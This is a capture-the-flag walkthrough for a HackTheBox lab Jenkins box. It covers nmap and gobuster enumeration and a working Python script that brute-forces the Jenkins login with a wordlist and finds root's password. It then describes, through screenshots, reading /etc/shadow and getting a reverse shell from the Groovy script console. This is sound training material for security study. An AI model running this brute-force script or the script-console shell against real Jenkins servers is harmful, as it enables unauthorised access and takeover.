---
layout: post
title: pennyworth
categories: htb
tags:
- htb
- starting_point
- pennyworth
- jenkins
author: nicoliboli
description: starting point | tier 1 | box 8
date: '2025-07-02 11:57:35 -0400'
---
# enumeration

```
$ nmap 10.129.249.185                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 09:00 EDT
Nmap scan report for 10.129.249.185
Host is up (0.099s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8080/tcp open  http-proxy
$ nmap -sC -sV -p 8080 10.129.249.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 09:11 EDT
Nmap scan report for 10.129.249.185
Host is up (0.10s latency).

$ nmap -p- --min-rate=1000 10.129.249.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 09:01 EDT
Nmap scan report for 10.129.249.185
Host is up (0.100s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 69.39 seconds

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```

## port 8080

visit the home page with burp running and a proxy setup

![penny_home](/assets/img/penny_home.png)

also look at what `wappanalyzer` has to say about what's running

![penny_wapp](/assets/img/penny_wapp.png)

so we know that we are dealing with a site that uses java, jetty (v9.4.39), and jenkins. run gobuster to see if there are any interesting directories

```
$ gobuster dir -u http://10.129.249.185:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -b 403
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.249.185:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2028]
/signup               (Status: 404) [Size: 8211]
/assets               (Status: 302) [Size: 0] [--> http://10.129.249.185:8080/assets/]
/logout               (Status: 302) [Size: 0] [--> http://10.129.249.185:8080/]
/error                (Status: 400) [Size: 6241]
/git                  (Status: 302) [Size: 0] [--> http://10.129.249.185:8080/git/]
/oops                 (Status: 200) [Size: 6503]
/cli                  (Status: 302) [Size: 0] [--> http://10.129.249.185:8080/cli/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

visit the `oops` uri and get the following

![penny_oops](/assets/img/penny_oops.png)

so now i know that the version of jenkins is 2.289.1. googled a bit and found that `admin` is a default account. try logging in with `admin:admin`, but get an error

![penny_invalid_login](/assets/img/penny_invalid_login.png)

# exploitation

didn't really see anything exploit-wise based on the version of jenkins, so i tried to bruteforce the login. i looked at what was happing in `burp` during login and created a python script that sent requests with that same information. i used the session functionality of requests because when i didn't, the `JSESSIONID` cookie didn't populate. i'm not showing the testing that i did, but i always test just one username/password combo and compare, in `burp`, the python requests generated one to the actual request

![penny_login_burp](/assets/img/penny_login_burp.png)

the username `admin` gave me nothing, so i thought maybe `root` might pop something and thankfully it did

```
$ cat req.py          
import sys
import requests
import argparse
from random import randrange
from bs4 import BeautifulSoup

proxy = { "http" : "http://127.0.0.1:8080" }

parser = argparse.ArgumentParser(epilog="ex: python {} -u http://10.129.249.185:8080 -U admin".format(sys.argv[0]))

parser.add_argument('-u', '--url', required=True, help='url')
parser.add_argument('-U', '--username', required=True, help='username')
args = parser.parse_args()

passwords = []
with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
    passwords = f.readlines()

for password in passwords:
    data = { "j_username" : args.username,
            "j_password" : password.decode().strip(),
            "from" : "",
            "Submit" : "Sign in"}

    s = requests.Session()
    s.get(args.url, proxies=proxy)
    r = s.post("{}/j_spring_security_check".format(args.url), data=data, proxies=proxy)
    if r.text.find("Invalid username or password") == -1:
        print("[*] password found!")
        print("[+] {} : {}".format(args.username, password.decode().strip()))
        break

$ python3 req.py -u http://10.129.249.185:8080 -U root 
[*] password found!
[+] root : password
```

![penny_dashboard](/assets/img/penny_dashboard.png)

i had some time to read about jenkins by this point and found [this](https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/) post particularly helpful when looking for direction. the jenkins [documentation](https://www.jenkins.io/doc/book/managing/script-console/) gave some good insight too. since i have `Administrator` permissions, i can access the script console and do quite a bit 

![penny_jenkins_docs](/assets/img/penny_jenkins_docs.png)

access the script console at `/script` and see if i can read files via the cmds in the documentation. then see if i can execute code via OrangeTsai's full-access scenario

![penny_shadow](/assets/img/penny_shadow.png)

![penny_uname](/assets/img/penny_uname.png)

had to play around with the reverse shell a bit, but got it with the help of [hacktricks](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script.html)

![penny_script_revshell](/assets/img/penny_script_revshell.png)

![penny_flag](/assets/img/penny_flag.png)